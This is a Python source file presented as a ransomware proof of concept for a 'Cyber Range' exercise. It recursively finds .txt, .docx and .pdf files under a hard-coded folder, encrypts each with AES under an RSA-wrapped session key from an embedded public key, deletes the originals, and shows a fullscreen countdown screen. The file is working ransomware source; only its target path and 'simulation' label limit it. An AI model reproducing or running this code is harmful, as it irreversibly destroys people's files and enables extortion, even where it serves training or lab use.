import base64
import os
from pathlib import Path
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP, AES
import tkinter as tk

# Public key with base64 encoding
pubKey = """LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFzcHZCMTJnd1RvbDdtWWtXTlVVbQp5RXp5a29nL2gvTS92ZTJvNlUyZTdPWTBxK2IyeUNzUzlSb2VOVEpjbnYxc3hwUHJKdDNSaXpGUzNCNEpsOGE1CkpqMXdGa2I4RXIrN2M4U2dLRXpKcVNoTk5xNnFCWWtHbmZRM056eklOKzdVMHZIN1BvU21ha3hNSVdYYjNQVzUKTTFoNnJmd1hwSnpoU0JBcTZjREJhSVJOVC83NlFoSmtibHNacTdLVDI3ck1sTDZGaUtVZkE5WXc4OVY4Q1RSTgpBQ2p0K25jekp3UFZBRmtCWWc0K1U3aDNmYnJDL1JJVGRMbCt6WVJFdExqREhCNjJ3Y2xOM0lNRVo3K1FvMFE3CnJGeE9OV0JNUG4vRDhEMTBDQUdlRHp4VTFYclVEOTFBNHA1b2VGQTJjOWE3RFdUOWQvNzk0S0JJb2dMTUdMaW4KOVFJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0t"""
pubKey = base64.b64decode(pubKey)

def scanRecurse(baseDir):
    '''
    Scanning and finding all the files that matches criteria in whitelist extensions
    '''
    for entry in os.scandir(baseDir):
        if entry.is_file():
            yield entry
        else:
            yield from scanRecurse(entry.path)

def encrypt(dataFile, publicKey):
    '''
    Encrypting using RSA for the session key and AES for the data.
    '''
    # Read data from file
    extension = dataFile.suffix.lower()
    dataFile = str(dataFile)
    with open(dataFile, 'rb') as f:
        data = f.read()
    
    # Convert data to bytes
    data = bytes(data)

    # Create public key object
    key = RSA.import_key(publicKey)
    sessionKey = os.urandom(16)

    # Encrypt the session key with the public key
    cipher = PKCS1_OAEP.new(key)
    encryptedSessionKey = cipher.encrypt(sessionKey)

    # Encrypt the data with the session key
    cipher = AES.new(sessionKey, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(data)

    # Save the encrypted data to file
    fileName = dataFile.split(extension)[0]
    fileExtension = '.CyberRange'
    encryptedFile = fileName + fileExtension
    with open(encryptedFile, 'wb') as f:
        [f.write(x) for x in (encryptedSessionKey, cipher.nonce, tag, ciphertext)]
    os.remove(dataFile)

def countdown(count):
    '''
    Displays a countdown timer.
    '''
    hour, minute, second = count.split(':')
    hour = int(hour)
    minute = int(minute)
    second = int(second)

    label['text'] = '{}:{}:{}'.format(hour, minute, second)

    if second > 0 or minute > 0 or hour > 0:
        if second > 0:
            second -= 1
        elif minute > 0:
            minute -= 1
            second = 59
        elif hour > 0:
            hour -= 1
            minute = 59
            second = 59
        root.after(1000, countdown, '{}:{}:{}'.format(hour, minute, second)) 

root = tk.Tk()
root.title('Cyber Range Ransomware')
root.attributes('-fullscreen', True)  # Set full screen
label1 = tk.Label(root, text='CYBERRANGE RANSOMWARE POC', font=('calibri', 100,'bold'))
label1.pack()
label2 = tk.Label(root, text='Your data is under rest, please don\'t pay me,\nthis just simulation !!\n\n', font=('calibri', 50,'bold'))
label2.pack()
label = tk.Label(root,font=('calibri', 100,'bold'), fg='red', bg='black')
label.pack()

# Whitelist of file extensions to be encrypted
whitelist = ['.txt', '.docx', '.pdf']  # Add more extensions as needed

# Change directory to the directory of the script
# Make sure to change the directory path accordingly
directory = 'C:/Users/MyWindows/Desktop/test' # CHANGE THIS

for item in scanRecurse(directory): 
    filePath = Path(item)
    fileType = filePath.suffix.lower()

    if fileType in whitelist:
        encrypt(filePath, pubKey)

# Start the countdown timer    
countdown('01:30:00')
root.mainloop()
